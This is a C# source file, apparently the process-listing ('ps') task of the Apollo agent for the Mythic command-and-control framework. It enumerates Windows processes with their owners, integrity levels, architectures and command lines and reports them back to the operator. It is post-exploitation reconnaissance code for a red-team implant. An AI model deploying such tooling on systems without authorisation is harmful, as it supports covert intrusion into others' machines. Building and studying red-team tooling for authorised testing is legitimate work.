#define COMMAND_NAME_UPPER

#if DEBUG
#define PS
#endif

#if PS
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32.SafeHandles;
using ApolloInterop.Classes;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using static ApolloInterop.Enums.Win32;

namespace Tasks
{
    public class ps : Tasking
    {
        [DataContract]
        internal struct PsParameters
        {
            [DataMember(Name = "extended")]
            public bool Extended;
        }

        // NtQueryInformationProcess information class 60 is ProcessCommandLineInformation.
        // It returns a UNICODE_STRING and its UTF-16 text in the caller's buffer.
        // This class is undocumented; an unsupported query leaves CommandLine empty.
        private const int ProcessCommandLineInformationClass = 60;

        private delegate IntPtr OpenProcess(ProcessAccessFlags access, bool inheritHandle, int processId);
        private delegate bool CloseHandle(IntPtr handle);
        private delegate bool OpenProcessToken(SafeProcessHandle processHandle, TokenAccessLevels access, out IntPtr tokenHandle);
        private delegate bool GetTokenInformation(SafeTokenHandle tokenHandle, TokenInformationClass informationClass,
            IntPtr information, int informationLength, out int returnLength);
        private delegate bool ConvertSidToStringSid(IntPtr sid, out IntPtr stringSid);
        private delegate IntPtr LocalFree(IntPtr memory);
        [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Unicode)]
        private delegate bool QueryFullProcessImageName(SafeProcessHandle processHandle, int flags, StringBuilder path, ref int size);
        private delegate bool ProcessIdToSessionId(uint processId, out uint sessionId);
        private delegate bool IsWow64Process(SafeProcessHandle processHandle, out bool wow64);
        private delegate bool IsWow64Process2(SafeProcessHandle processHandle, out ushort processMachine, out ushort nativeMachine);
        private delegate int NtQueryInformationProcess(SafeProcessHandle processHandle, int informationClass,
            IntPtr information, int informationLength, out int returnLength);

        // These wrappers own only real handles returned by OpenProcess and
        // OpenProcessToken. GetCurrentProcess's valid -1 pseudo-handle is never wrapped.
        private abstract class SafeCloseHandle : SafeHandleZeroOrMinusOneIsInvalid
        {
            private readonly CloseHandle _release;

            protected SafeCloseHandle(IntPtr value, CloseHandle release) : base(true)
            {
                _release = release;
                SetHandle(value);
            }

            protected override bool ReleaseHandle()
            {
                try { return _release(handle); }
                catch { return false; }
            }
        }

        private sealed class SafeProcessHandle : SafeCloseHandle
        {
            public SafeProcessHandle(IntPtr value, CloseHandle release) : base(value, release) { }
        }

        private sealed class SafeTokenHandle : SafeCloseHandle
        {
            public SafeTokenHandle(IntPtr value, CloseHandle release) : base(value, release) { }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct ProcessBasicInformation
        {
            public int ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public int BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UnicodeString
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SidAndAttributes
        {
            public IntPtr Sid;
            public int Attributes;
        }

        private readonly OpenProcess _openProcess;
        private readonly CloseHandle _closeHandle;
        private readonly OpenProcessToken _openProcessToken;
        private readonly GetTokenInformation _getTokenInformation;
        private readonly ConvertSidToStringSid _convertSidToStringSid;
        private readonly LocalFree _localFree;
        private readonly QueryFullProcessImageName _queryFullProcessImageName;
        private readonly ProcessIdToSessionId _processIdToSessionId;
        private readonly NtQueryInformationProcess _ntQueryInformationProcess;
        private readonly IsWow64Process2 _isWow64Process2;
        private readonly IsWow64Process _isWow64Process;

        public ps(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            var api = _agent.GetApi();
            _openProcess = api.GetLibraryFunction<OpenProcess>(Library.KERNEL32, "OpenProcess");
            _closeHandle = api.GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
            _openProcessToken = api.GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
            _getTokenInformation = api.GetLibraryFunction<GetTokenInformation>(Library.ADVAPI32, "GetTokenInformation");
            _convertSidToStringSid = api.GetLibraryFunction<ConvertSidToStringSid>(Library.ADVAPI32, "ConvertSidToStringSidW");
            _localFree = api.GetLibraryFunction<LocalFree>(Library.KERNEL32, "LocalFree");
            _queryFullProcessImageName = api.GetLibraryFunction<QueryFullProcessImageName>(Library.KERNEL32, "QueryFullProcessImageNameW");
            _processIdToSessionId = api.GetLibraryFunction<ProcessIdToSessionId>(Library.KERNEL32, "ProcessIdToSessionId");
            _ntQueryInformationProcess = api.GetLibraryFunction<NtQueryInformationProcess>(Library.NTDLL, "NtQueryInformationProcess");
            try
            {
                _isWow64Process2 = api.GetLibraryFunction<IsWow64Process2>(Library.KERNEL32, "IsWow64Process2");
            }
            catch { }
            _isWow64Process = api.GetLibraryFunction<IsWow64Process>(Library.KERNEL32, "IsWow64Process");
        }

        public override void Start()
        {
            bool extended = !string.IsNullOrWhiteSpace(_data.Parameters) &&
                _jsonSerializer.Deserialize<PsParameters>(_data.Parameters).Extended;
            var results = new List<ProcessInformation>();
            Process[] processes;
            try
            {
                // .NET Framework takes a system process snapshot here; it does not
                // open handles. Avoid Process.Handle, which opens with all access.
                processes = Process.GetProcesses();
            }
            catch (Exception ex)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("Unable to enumerate processes: " + ex.Message, true, "error"));
                return;
            }

            try
            {
                foreach (Process process in processes)
                {
                    if (_cancellationToken.IsCancellationRequested)
                        break;

                    try
                    {
                        results.Add(ReadProcess(process, extended));
                    }
                    catch
                    {
                        // Processes can exit while the snapshot is being read.
                    }
                }
            }
            finally
            {
                foreach (Process process in processes)
                    process.Dispose();
            }

            results.Sort((left, right) => left.PID.CompareTo(right.PID));
            ProcessInformation[] output = results.ToArray();
            if (output.Length == 0)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("No Process Data Collected", true));
                return;
            }

            IMythicMessage[] messages = new IMythicMessage[output.Length];
            Array.Copy(output, messages, output.Length);
            _agent.GetTaskManager().AddTaskResponseToQueue(
                CreateTaskResponse(_jsonSerializer.Serialize(output), true, "completed", messages));
        }

        private ProcessInformation ReadProcess(Process process, bool extended)
        {
            var result = new ProcessInformation
            {
                PID = process.Id,
                Name = "",
                Username = "",
                Architecture = "",
                ProcessPath = "",
                ParentProcessId = -1,
                CommandLine = "",
                StartTime = "",
                Description = "",
                Signer = "",
                CompanyName = "",
                WindowTitle = "",
                SessionId = -1,
                UpdateDeleted = true
            };

            try { result.Name = process.ProcessName; } catch { }
            try
            {
                if (_processIdToSessionId((uint)result.PID, out uint sessionId))
                    result.SessionId = (int)sessionId;
            }
            catch { }

            try
            {
                // Do not use Process.Handle: .NET may request broader access on our behalf.
                using (var processHandle = new SafeProcessHandle(
                    _openProcess(ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, false, result.PID),
                    _closeHandle))
                {
                    if (!processHandle.IsInvalid)
                    {
                        result.ProcessPath = GetProcessPath(processHandle);
                        result.Architecture = GetArchitecture(processHandle);
                        ReadTokenDetails(processHandle, ref result);
                        if (extended)
                        {
                            result.ParentProcessId = GetParentProcessId(processHandle);
                            result.CommandLine = GetCommandLine(processHandle);
                        }
                    }
                }
            }
            catch { }

            if (extended)
                ReadExtendedFileDetails(process, ref result);

            return result;
        }

        private string GetProcessPath(SafeProcessHandle processHandle)
        {
            var path = new StringBuilder(32768);
            int length = path.Capacity;
            try
            {
                return _queryFullProcessImageName(processHandle, 0, path, ref length)
                    ? path.ToString() : "";
            }
            catch { return ""; }
        }

        private string GetArchitecture(SafeProcessHandle processHandle)
        {
            try
            {
                if (_isWow64Process2 != null &&
                    _isWow64Process2(processHandle, out ushort processMachine, out ushort nativeMachine))
                {
                    ushort machine = processMachine == 0 ? nativeMachine : processMachine;
                    switch (machine)
                    {
                        case 0x014c: return "x86";
                        case 0x8664: return "x64";
                        case 0xAA64: return "arm64";
                        case 0x01c4: return "arm";
                    }
                }
                else if (_isWow64Process != null && _isWow64Process(processHandle, out bool wow64))
                {
                    return wow64 ? "x86" : (Environment.Is64BitOperatingSystem ? "x64" : "x86");
                }
            }
            catch { }
            return "";
        }

        private void ReadTokenDetails(SafeProcessHandle processHandle, ref ProcessInformation result)
        {
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                if (!_openProcessToken(processHandle, TokenAccessLevels.Query, out tokenHandle))
                    return;

                using (var token = new SafeTokenHandle(tokenHandle, _closeHandle))
                {
                    tokenHandle = IntPtr.Zero;
                    try
                    {
                        using (var identity = new WindowsIdentity(token.DangerousGetHandle()))
                            result.Username = identity.Name;
                    }
                    catch { }

                    result.IntegrityLevel = GetIntegrityLevel(token);
                }
            }
            catch { }
            finally
            {
                // Ownership transfers to SafeTokenHandle after construction.
                if (tokenHandle != IntPtr.Zero)
                    _closeHandle(tokenHandle);
            }
        }

        private int GetIntegrityLevel(SafeTokenHandle tokenHandle)
        {
            _getTokenInformation(tokenHandle, TokenInformationClass.TokenIntegrityLevel,
                IntPtr.Zero, 0, out int length);
            if (length <= 0)
                return 0;

            IntPtr information = Marshal.AllocHGlobal(length);
            try
            {
                if (!_getTokenInformation(tokenHandle, TokenInformationClass.TokenIntegrityLevel,
                    information, length, out _))
                    return 0;

                var label = (SidAndAttributes)Marshal.PtrToStructure(information, typeof(SidAndAttributes));
                if (!_convertSidToStringSid(label.Sid, out IntPtr stringSid))
                    return 0;

                try
                {
                    string sid = Marshal.PtrToStringUni(stringSid);
                    int separator = sid.LastIndexOf('-');
                    if (separator < 0 || !int.TryParse(sid.Substring(separator + 1), out int rid))
                        return 0;
                    if (rid >= 12288) return 3;
                    if (rid >= 8192) return 2;
                    if (rid >= 4096) return 1;
                    return 0;
                }
                finally
                {
                    _localFree(stringSid);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(information);
            }
        }

        private int GetParentProcessId(SafeProcessHandle processHandle)
        {
            int size = Marshal.SizeOf(typeof(ProcessBasicInformation));
            IntPtr buffer = Marshal.AllocHGlobal(size);
            try
            {
                if (_ntQueryInformationProcess(processHandle, 0, buffer, size, out _) < 0)
                    return -1;
                var information = (ProcessBasicInformation)Marshal.PtrToStructure(
                    buffer, typeof(ProcessBasicInformation));
                return information.InheritedFromUniqueProcessId.ToInt32();
            }
            catch { return -1; }
            finally { Marshal.FreeHGlobal(buffer); }
        }

        private string GetCommandLine(SafeProcessHandle processHandle)
        {
            int size = 4096;
            for (int attempt = 0; attempt < 2; attempt++)
            {
                IntPtr buffer = Marshal.AllocHGlobal(size);
                try
                {
                    int status = _ntQueryInformationProcess(processHandle, ProcessCommandLineInformationClass,
                        buffer, size, out int required);
                    if (status >= 0)
                    {
                        var value = (UnicodeString)Marshal.PtrToStructure(buffer, typeof(UnicodeString));
                        long offset = value.Buffer.ToInt64() - buffer.ToInt64();
                        if (value.Length % 2 != 0 || value.Length > value.MaximumLength ||
                            offset < Marshal.SizeOf(typeof(UnicodeString)) ||
                            offset > size || value.Length > size - offset)
                            return "";
                        return Marshal.PtrToStringUni(value.Buffer, value.Length / 2) ?? "";
                    }

                    if (required <= size || required > 131072)
                        return "";
                    size = required;
                }
                catch { return ""; }
                finally { Marshal.FreeHGlobal(buffer); }
            }
            return "";
        }

        private static void ReadExtendedFileDetails(Process process, ref ProcessInformation result)
        {
            try { result.WindowTitle = process.MainWindowTitle; } catch { }
            if (result.ProcessPath.Length == 0)
                return;

            try
            {
                FileVersionInfo version = FileVersionInfo.GetVersionInfo(result.ProcessPath);
                result.Description = version.FileDescription ?? "";
                result.CompanyName = version.CompanyName ?? "";
            }
            catch { }
        }
    }
}
#endif
